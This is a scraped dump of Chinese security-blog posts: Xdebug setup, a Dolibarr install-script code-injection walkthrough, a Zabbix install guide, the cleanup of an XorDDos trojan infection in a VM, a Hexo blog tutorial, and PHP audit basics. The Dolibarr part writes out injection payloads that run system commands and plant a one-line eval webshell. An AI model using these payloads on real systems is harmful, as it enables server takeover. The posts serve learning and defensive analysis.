123456789101112131415161718192021222324252627282930313233343536373839404142434445[XDebug];性能分析文件的存放位置，默认值为/tmpxdebug.profiler_output_dir=&quot;G:\\PHP\\PhpStudy\\tmp\\xdebug&quot;;函数调用跟踪信息输出文件目录，默认值为/tmpxdebug.trace_output_dir=&quot;G:\\PHP\\PhpStudy\\tmp\\xdebug&quot;;zend_extension=&quot;G:\\PHP\\PhpStudy\\php\\php-5.5.38\\ext\\php_xdebug.dll&quot;zend_extension=&quot;G:\\PHP\\PhpStudy\\php\\php-5.5.38\\ext\\php_xdebug.dll&quot;;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0xdebug.auto_trace=1;是否允许Xdebug跟踪函数参数，默认值为0xdebug.collect_params=1;是否允许Xdebug跟踪函数返回值，默认值为0xdebug.collect_return=1;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0xdebug.profiler_enable = 1;性能分析文件的命名规则，默认值为cachegrind.out.%pxdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.remote_enable = 1;用于zend studio远程调试的应用层通信协议xdebug.remote_handler = &quot;dbgp&quot;xdebug.idekey = PHPSTORMxdebug.remote_host = &quot;127.0.0.1&quot;xdebug.remote_port = 9000 3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。 open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。 4.选择PHP的版本信息。 Debug端口设置 IDEKEY： 配置PHP Web Application 查看配置： xdebug配置完成了 3.实现截取操作 在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。 在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。 选择一个浏览器打开写好的文件 截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。 Dolibarr ERP/CRM php代码注入漏洞Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。 1、先配置好Dolibarr环境。 将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。 然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。 打开浏览器输入127.0.0.1/install 然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。 安装完毕后，会在Phpstrom中自动截取到step1.php的文件。 2、开始代码的修改。 step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法 按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。 ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。 继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。 继续往下走，直接定位到写入数据库名称的代码段 提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。 数据库名称改为dolibarr \\’;phpinfo();// 配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止 Ø通过包含此文件的文件去间接的执行代码 更改payload，执行系统命令并getshell 将db_name改为dolibarr \\’;system($_GET[cmd]);// 访问/insex.php?cmd={command} 修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php 请求后会在网站根目录下生成一句话木马，尝试用菜刀连接","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"Zabbix可视化监控的搭建","slug":"Zabbix可视化监控的搭建","date":"2018-08-10T12:07:00.000Z","updated":"2018-08-13T13:51:49.833Z","comments":true,"path":"2018/08/10/Zabbix可视化监控的搭建/","link":"","permalink":"http://yoursite.com/2018/08/10/Zabbix可视化监控的搭建/","excerpt":"【前言】 zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。","text":"【前言】 zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 0x01 【操作环境】CentOS Linux release 7.5.1804 (Core)zabbix版本：zabbix-3.4.12 0x02 【环境准备】1、LAMP安装和启动：12345Apache安装：yum install http* -y Apache启动：systemctl start httpd Mariadb安装：yum install mariadb-server mariadb -y Mariadb启动：systemctl start mariadb.service PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y LAMP安装参考资料：https://www.cnblogs.com/me80/p/7218883.html 2、GCC环境安装1yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y 3、selinux和防火墙处理进入seliunx配置文件123vim /etc/selinux/config SELINUX=disabled #重启才生效selinux：setenforce 0 #临时关闭systemctl stop firewalld.service #关闭防火墙 0x03 【安装步骤】一、安装zabbix1、在官网下载zabbix安装包，https://www.zabbix.com/download2、解压软件包并安装依赖包123cd /usr/local/src tar -zxvf zabbix-3.4.12.tar.gz yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl 3、编译安装zabbix123cd zabbix-3.4.3/ #切换进入zabbix目录 ./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2 #编译zabbix make&amp;&amp;make install #安装zabbix,此步骤有点长，请耐心等待。 二、配置zabbix1、创建用户账户对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：12groupadd zabbixuseradd -g zabbix zabbix 2、数据库导入zabbix template使用数据库用户zabbix登录数据库123456mysql –uzabbix –puse zabbix; #切换到zabbix库#导入zabbix默认表source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql; source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql; 3、创建zabbix用户和日志目录并给予权限123useradd -s /sbin/nologin zabbix #创建用户mkdir /usr/local/zabbix/logs #创建目录chown -R zabbix:zabbix /usr/local/zabbix #给予权限 4、配置zabbix的服务端（server）123456789101112vim /data/server/zabbix/etc/zabbix_server.conf &gt;LogFile=/data/server/zabbix/logs/zabbix_server.logPidFile=/data/server/zabbix/zabbix_server.pidDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=123456DBSocket=/data/server/mysql/mysql.sockTimeout=4LogSlowQueries=3000Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf 5、配置zabbix客户端（agent）123456789vim /data/server/zabbix/etc/zabbix_agentd.conf&gt;PidFile=/data/server/zabbix/zabbix_agentd.pidLogFile=/data/server/zabbix/logs/zabbix_agentd.logServer=127.0.0.1ListenPort=10050ServerActive=127.0.0.1Hostname=Zabbix serverInclude=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf 6、配置PHP相应的文件123456789vim /etc/php.ini&gt;php_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300php_value always_populate_raw_post_data -1date.timezone = Asia/Shanghai 7、安装zabbix web界面123mkdir /var/www/html/zabbixcd /usr/local/src/zabbix-3.4.0/frontends/php cp -a . /var/www/html/zabbix 8、启动zabbix服务1234systemctl start httpd #启动apache服务/data/server/mysql/support-files/mysql.server start #启动数据库服务/data/server/zabbix/sbin/zabbix_server #启动zabbix服务端服务/data/server/zabbix/sbin/zabbix_agentd #在所有的被监控机器上启动zabbix_agentd 三、配置zabbix前端1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbixhttp://192.168.199.206/zabbix/setup.php你可以看到前端安装向导的第一个页面。 2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加vim /etc/php.ini 如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令yum install php-bcmath php-mbstring php-xmlwriter php-xmlreaderPHP LDAP Warning 不用管，直接下一步 3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。 4、输入Zabbix Server的详细信息。 5、检查设置信息。 6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。cd /var/www/html/zabbix/confrz使用rz命令上传就可以了 7、上传完毕后，完成安装。 8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。 登录后显示界面： 使用说明参考文档：https://www.zabbix.com/documentation/3.4/manual/quickstart/login 0x04 【参考文献】https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQLhttps://www.cnblogs.com/kowloon/p/7771495.htmlhttp://blog.51cto.com/xpu2001/2052634","categories":[{"name":"安全运维","slug":"安全运维","permalink":"http://yoursite.com/categories/安全运维/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"},{"name":"监控","slug":"监控","permalink":"http://yoursite.com/tags/监控/"}]},{"title":"记一次XorDDos木马的清除","slug":"记一次XorDDos木马的清除","date":"2018-08-10T10:00:00.000Z","updated":"2018-08-10T11:52:14.466Z","comments":true,"path":"2018/08/10/记一次XorDDos木马的清除/","link":"","permalink":"http://yoursite.com/2018/08/10/记一次XorDDos木马的清除/","excerpt":"【前言】 一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。","text":"【前言】 一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。 0x01 【实现环境】CentOS Linux release 7.5.1804 (Core) 在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！ 0x02 【植入木马】把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。12345unzip XorDDos样本-密码123.zip chmod +x a753cb1ff86c742bb497155362664c3b ./a753cb1ff86c742bb497155362664c3b sh b3c466263551794bb247c68ff1bc357a.sh ./b3c466263551794bb247c68ff1bc357a 0x03 【杀马全过程】1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。通过top发现会有几个可疑的程序占用了CPU。1top 2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。1tcpdump -i ens33 3.通过lsof -i 看到了一个可疑的服务，PID为1657。1lsof -i 4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。1kill -9 1657 查杀思路：由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动以下查杀可以自由组合，按上面查杀思路排列即可！ 5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)1ll /proc/9257 我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。 6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/1crontab -l #查看计划任务 1ll /etc/cron.hourly/ #发现了木马的执行文件位置 7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。1cat /etc/cron.hourly/ccyfuny.sh 对其文件去权chmod 000 /usr/bin/ccyfuny 8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。1ll -aR /etc/rc.d 对其去权 chmod 000 /etc/init.d/ccyfuny 9.reboot重启系统,然后查看CPU和开放端口以及进程情况。查看top没有发现可疑程序。1top 也没发现可疑的进程1lsof -i 也没发现可疑的端口开放1netstat -anlpt 10.所有文件去完权后，接着清除所有的可疑文件：123rm -rf /usr/bin/ccyfuny ccyfuny.shrm -rf /etc/cron.hourly/ccyfuny.sh rm -rf /etc/init.d/ccyfuny 11.再reboot重启系统，并没有发现可疑文件了。12netstat -anlptlsof -i 总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。 0x04 【参考文件】https://blog.csdn.net/gosenkle/article/details/80220788https://blog.csdn.net/rigous/article/details/73970391","categories":[{"name":"木马查杀","slug":"木马查杀","permalink":"http://yoursite.com/categories/木马查杀/"}],"tags":[{"name":"木马查杀","slug":"木马查杀","permalink":"http://yoursite.com/tags/木马查杀/"}]},{"title":"Hexo-GitHub搭建静态博客平台(Next主题)","slug":"Hexo-GitHub搭建静态博客平台-Next主题","date":"2018-08-09T13:23:00.000Z","updated":"2018-08-13T13:51:24.694Z","comments":true,"path":"2018/08/09/Hexo-GitHub搭建静态博客平台-Next主题/","link":"","permalink":"http://yoursite.com/2018/08/09/Hexo-GitHub搭建静态博客平台-Next主题/","excerpt":"gitHub是一个面向开源及私有软件项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。","text":"gitHub是一个面向开源及私有软件项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 0x01 准备工作域名我的域名：www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。国内可以去阿里云或腾讯云购买域名，价格也很便宜。 环境技术前往github官网https://github.com 注册一个github账号。 Hexo 的安装前提就是得有 Node.js 和 Git 。 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。 Node 官方版本安装：https://nodejs.org/en/ Git 官方版本安装：https://git-scm.com/download/win 我用到软件版本（你们可以在官方下载最新版的） Git：Git-2.18.0-64-bit Node：node-v10.7.0-x64 验证安装：任何位置鼠标右击出现Git Bash Here cmd下 1git --version 验证安装：cmd下 1node -v 0x02 Github 配置创建仓库 new repository在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。 在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。 简单来说，User Pages 与 Project Pages的区别是： User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。 用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。 User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。 User Pages 通过 http(s)://username.github.io 进行访问，而 Projects Pages通过 http(s)://username.github.io/projectname 进行访问。 另外注意： 注册的邮箱一定要验证，否则不会成功； 仓库名字必须是：username.github.io，其中username是你的用户名； 仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效； 0x03 配置SSH key用于本地与github数据交换生成并配置key执行如下命令12git config --global user.name &quot;liuxianan&quot; #你的github用户名git config --global user.email &quot;xxx@qq.com&quot; #填写你的github注册邮箱 生成ssh密钥12cd ~/. ssh #检查本机已存在的ssh密钥ssh-keygen -t rsa -C &quot;邮件地址&quot; #生成密钥 连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\\id_rsa.pub文件，并复制其中内容 打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可 测试ssh本地执行 ssh -T git@github.com #注意邮箱地址不用改如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 0x04 安装hexo以下命令都是在git命令行中实现 首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) 在git命令框中安装Hexo 1npm install -g hexo 1hexo init 此目录会自动生成hexo相关文件 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。 本地预览 hexo目录中执行123hexo clean #清除缓存hexo g #生成静态页面hexo s #启动本地预览服务 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github 浏览器访问[http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world] 0x05 写博客进入hexo根目录 1hexo new &apos;my-first-blog&apos; ‘ ‘中为你本篇博客的名称，执行完成后，会自动在\\hexo\\source_posts\\目录下生成.md文件， 只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器） 0x06 上传到github上传前的配置配置站点配置文件_config.yml中的deploy部分： 1234deploy: type: git repository: git@github.com:yourname/yourname.github.io.git branch: master 安装上传插件1npm install hexo-deployer-git --save 上传文件在hexo根目录下 1hexo d 会将有所改动的内容全部提交至github 常用hexo命令123456789101112131415161718hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help #查看帮助hexo version #查看Hexo的版本hexo clean #清除缓存缩写：hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy组合命令：hexo s -g #生成并本地预览hexo d -g #生成并上传 0x07 更改默认hexo主题及优化主题下载进入hexo根目录 执行 1git clone https://github.com/iissnan/hexo-theme-next themes/next 执行完成后会在hexo\\themes\\ 目录下生成next目录 next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件 你也可以自己更换自己喜欢的主题https://hexo.io/themes/ ，官网有很多主题， 主题应用配置站点配置文件 寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错） 主题预览执行 123hexo clean #清除缓存hexo g #重新生成代码hexo s #部署到本地 浏览器访问 http://127.0.0.1:4000 查看效果 0x08 主题简单优化设置布局主题配置文件中 寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可 123#scheme: Muse#scheme: Mistscheme: Pisces Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 设置显示语言站点配置文件中 寻找language 字段，设置其值为 1language: zh-Hans 语言文件位于hexo\\themes\\next\\languages目录下 设置菜单主题配置文件中 寻找menu字段 123456789menu: home: / || home #主页 categories: /categories/ || th #分类页 tags: /tags/ || tags #标签页 about: /about/ || user #关于页 #archives: /archives/ || archive #归档页 #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat #公益404 除主页与归档页外，其余页面需要手动创建 每行中 || 后的内容为指定此menu的图标 添加标签页新建页面 进入hexo根目录 1hexo new page tags 命令执行后，hexo\\source\\tags目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加type行) 123title: tagsdate: 2016-11-15 19:10:05type: &quot;tags&quot; 设置具体博客文章tags 对于hexo\\source_post目录下具体博客文章设置tags(设置tags行) 123title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github] 添加分类页面新建页面 进入hexo根目录 1hexo new page categories 命令执行后，hexo\\source\\categories目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加categories行) 123title: categoriesdate: 2016-11-15 19:11:13type: &quot;categories&quot; 设置具体博客文章categories 对于hexo\\source_post目录下具体博客文章设置categories(设置categories行) 1234title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github]categories: 搭建博客 添加关于页面添加页面 进入hexo根目录 1hexo new page about 命令执行后，hexo\\source\\about目录中生成index.md文件 修改index.md文件 123456789title: aboutdate: 2016-11-15 19:08:50## 关于我一只学习的小菜鸟，欢迎分享知识。QQ：Email: 设置站内搜索进入hexo根目录 1npm install hexo-generator-searchdb --save 站点配置文件中添加 12345search: path: search.xml field: post format: html limit: 10000 0x09 其他设置hexo 首页文章只显示一部分在博客文章适当位置添加&lt;!--more--&gt; 标记即可 网站底部字数统计进入hexo根目录 1npm install hexo-wordcount --save hexo\\themes\\next\\/layout_partials\\footer.swig文件中末尾添加 1234&lt;div class=&quot;theme-info&quot;&gt; &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt; &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;&lt;/div&gt; 修改文章底部的带#号的标签修改hexo\\themes\\next\\layout_macro\\post.swig文件，搜索rel=&quot;tag&quot;&gt;# ，改为&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在hexo\\themes\\next\\layout_macro目录下，新建passage-end-tag.swig ，并添加如下内容 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开hexo\\themes\\next\\layout_macro\\post.swig文件，在post-body 之后添加 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 打开主题配置文件，在末尾添加 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 0x010 访问线上博客执行hexo cleanhexo ghexo d浏览器访问https://yourname.github.io （yourname是你的github用户名） 设置域名解析ping一下你的博客域名，获取其IP地址 在阿里云或腾讯云设置域名解析 在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀) 右键新建txt文本-&gt;输入你购买的域名www.ainusers.top-&gt;保存关闭 然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可 上传进入hexo目录 hexo cleanhexo ghexo d即可使用自定义域名访问博客，并且原博客域名也不会失效 Hexo Admin后台管理博客工具使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。 Hexo Admin介绍官方网站：https://jaredforsyth.com/hexo-admin/属于hexo插件系列，使用B/S架构对博客进行后台管理 安装进入/hexo目录git bash下1npm install --save hexo-admin 访问hexo后台管理界面git bash下1hexo server -d 访问http://localhost:4000/即可访问本地博客 访问http://localhost:4000/admin即可进入Hexo Admin后台管理界面 配置Hexo AdminSettings选项下 点击Setup authentification here 配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串 下方会生成配置文件字段，将此复制到站点目录下_config.yml中 重启hexo server -d，再次访问http://localhost:4000/admin则需输入账号密码登陆。 参考连接https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.htmlhttp://theme-next.iissnan.com/getting-started.htmlhttp://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.htmlhttps://www.cnblogs.com/syd192/p/6074323.html https://blog.csdn.net/ainuser/article/details/77609180","categories":[{"name":"搭建博客","slug":"搭建博客","permalink":"http://yoursite.com/categories/搭建博客/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://yoursite.com/tags/博客/"}]},{"title":"PHP代码审计 基础知识","slug":"PHP代码审计-基础知识","date":"2018-08-08T03:04:00.000Z","updated":"2018-08-22T14:42:31.763Z","comments":true,"path":"2018/08/08/PHP代码审计-基础知识/","link":"","permalink":"http://yoursite.com/2018/08/08/PHP代码审计-基础知识/","excerpt":"本文记录 PHP 代码审计的学习过程 PHP 代码审计博客目录","text":"本文记录 PHP 代码审计的学习过程 PHP 代码审计博客目录 1. 环境准备1.1 测试运行环境安装 wamp 1.2 PHP 编写工具 EditPlu Notepad++ Zendstudio 10 百度云下载链接 1.3 代码审计工具Seay源代码审计系统 百度云下载链接 1.4 代码审计平台 DVWA GitHub 链接 ZVulDrill GitHub 链接 2. 注释 单行注释 =&gt; //单行注释 多行注释 =&gt; /*多行注释*/ 3. 单引号和双引号 单引号不解析变量 双引号解析变量 aaa=’123’ echo &apos;$aaa&apos; =&gt; 结果为 $aaa echo &quot;$aaa&quot; =&gt; 结果为 123 4. 输出函数 echo 或者 print：最简单的输出方法 print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据 var_dump 会额外输出数据类型 print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空 var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。 5. 超全局变量1超全局变量——超全局变量是在全部作用域中始终可用的内置变量 1. 简介 在php 中可由用户操作的全局变量列表如下: $GLOBALS — 引用全局作用域中可用的全部变量 $_SERVER — 服务器和执行环境信息 $_GET — HTTP GET 变量 $_POST — HTTP POST 变量 $_FILES — HTTP 文件上传变量 $_REQUEST — HTTP Request 变量 $_SESSION — Session 变量 $_ENV — 环境变量 $_COOKIE — HTTP Cookies 已经被弃用的超全局变量 $_HTTP_COOKIE_VARS $_HTTP_ENV_VARS $_HTTP_GET_VARS $_HTTP_POST_FILES $_HTTP_POST_VARS $_HTTP_SERVER_VARS 2. 超全局变量示例 $GLOBALS 例一：1234567891011121314151617&lt;?php$moon=&quot;1&quot;;echo $GLOBALS[&apos;moon&apos;];?&gt;# 显示结果为1# 例二&lt;?phpfunction test()&#123; echo $moon=&quot;2&quot;; echo $GLOBALS[&apos;moon&apos;];&#125;$moon=&quot;1&quot;;test();?&gt;# 显示结果为 21 # 函数内部为局部变量，不被 $GLOBALS 所识别 $_SERVER test1.php &lt;?php print_r($_SERVER); ?&gt; 12345test2.php &lt;?php $_SERVER=&apos;aaaaaa&apos;; print_r($_SERVER); ?&gt; 输出结果为服务器的配置信息 输出结果可以被覆盖 $_GET test.php &lt;?php print_r($_GET); ?&gt; 输出结果为 URL 中的 GET 变量的数据 $_POST test.php &lt;?php print_r($_POST); ?&gt; 输出结果为 URL 中的 POET 变量的数据 $_FILES file.html&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; test.php&lt;?phpprint_r($_FILES);?&gt; 输出结果为提交的文件的信息 $_REQUEST 1234567891011121314 test1.php &lt;?php print_r($_REQUEST); ?&gt; test2.php &lt;?php $_REQUEST=&apos;aaaaaa&apos;; print_r($_REQUEST); ?&gt;输出结果可以被覆盖![](https://i.imgur.com/W6GgqVz.png) $_SESSION test1.php &lt;?php print_r($_SESSION); ?&gt; 12345test2.php &lt;?php $_SESSION=&apos;aaaaaa&apos;; print_r($_SESSION); ?&gt; 输出结果可以被覆盖 $_ENV test1.php &lt;?php print_r($_ENV); ?&gt; 12345678910test2.php &lt;?php 